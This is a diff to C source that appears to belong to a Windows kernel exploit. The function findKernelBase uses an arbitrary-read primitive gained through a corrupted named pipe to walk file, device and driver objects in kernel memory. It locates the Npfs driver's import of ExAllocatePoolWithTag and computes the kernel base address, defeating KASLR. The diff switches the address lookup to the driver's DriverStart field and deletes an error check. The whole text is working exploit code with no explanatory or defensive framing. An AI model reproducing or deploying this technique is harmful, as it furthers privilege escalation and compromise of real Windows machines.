@@ -16,38 +16,31 @@ uintptr_t findKernelBase(pipe_pair_t* ghost_pipe, exploit_addresses_t* addrs)
     uintptr_t pipe_queue_entry_addr;
     ArbitraryRead(ghost_pipe, addrs->root_pipe_queue_entry, (char*)&pipe_queue_entry_addr, 0x8);
     printf("[+] pipe_queue_entry_addr: 0x%llX\n", pipe_queue_entry_addr);
-    if (pipe_queue_entry_addr == 0x434343434343005A)
-    {
-        fprintf(stderr, "[-] Error: Invalid pipe_queue_entry_addr value\n");
-        return NULL;
-    }
 
     addrs->ghost_vs_chunk = pipe_queue_entry_addr - sizeof(POOL_HEADER) - sizeof(HEAP_VS_CHUNK_HEADER);
     printf("[+] ghost_chunk: 0x%llX\n", addrs->ghost_vs_chunk);
 
-    uintptr_t file_object_addr = addrs->root_pipe_queue_entry - ROOT_PIPE_QUEUE_ENTRY_OFFSET + FILE_OBJECT_OFFSET;
-    printf("[+] file_object_addr: 0x%llX\n", file_object_addr);
-
+    uintptr_t file_object_ptr = addrs->root_pipe_queue_entry - ROOT_PIPE_QUEUE_ENTRY_OFFSET + FILE_OBJECT_OFFSET;
     uintptr_t file_object;
-    ArbitraryRead(ghost_pipe, file_object_addr, (char*)&file_object, 0x8);
-    printf("[+] File object: 0x%llX\n", file_object);
+    ArbitraryRead(ghost_pipe, file_object_ptr, (char*)&file_object, 0x8);
+    printf("[+] FILE_OBJECT: 0x%llX\n", file_object);
 
     uintptr_t device_object;
     ArbitraryRead(ghost_pipe, file_object + 8, (char*)&device_object, 0x8);
-    printf("[+] Device object: 0x%llX\n", device_object);
+    printf("[+] DEVICE_OBJECT: 0x%llX\n", device_object);
 
     uintptr_t driver_object;
     ArbitraryRead(ghost_pipe, device_object + 8, (char*)&driver_object, 0x8);
-    printf("[+] Driver object: 0x%llX\n", driver_object);
+    printf("[+] DRIVER_OBJECT: 0x%llX\n", driver_object);
 
-    uintptr_t NpFsdCreate;
-    ArbitraryRead(ghost_pipe, driver_object + 0x70, (char*)&NpFsdCreate, 0x8);
-    printf("[+] NpFsdCreate: 0x%llX\n", NpFsdCreate);
+    uintptr_t npfs_base;
+    ArbitraryRead(ghost_pipe, driver_object + 0x18, (char*)&npfs_base, 0x8);
+    printf("[+] DriverStart (Npfs): 0x%llX\n", npfs_base);
 
-    uintptr_t ExAllocatePoolWithTag_addr = NpFsdCreate - Npfs_NpFsdCreate_OFFSET + Npfs_imp_ExAllocatePoolWithTag_OFFSET;
+    uintptr_t ExAllocatePoolWithTag_ptr = npfs_base + Npfs_imp_ExAllocatePoolWithTag_OFFSET;
     uintptr_t ExAllocatePoolWithTag;
-    ArbitraryRead(ghost_pipe, ExAllocatePoolWithTag_addr, (char*)&ExAllocatePoolWithTag, 0x8);
-    printf("[+] ExAllocatePoolWithTag: 0x%llX\n", ExAllocatePoolWithTag);
+    ArbitraryRead(ghost_pipe, ExAllocatePoolWithTag_ptr, (char*)&ExAllocatePoolWithTag, 0x8);
+    printf("[+] nt!ExAllocatePoolWithTag: 0x%llX\n", ExAllocatePoolWithTag);
 
     uintptr_t kernel_base = ExAllocatePoolWithTag - nt_ExAllocatePoolWithTag_OFFSET;
     return kernel_base;
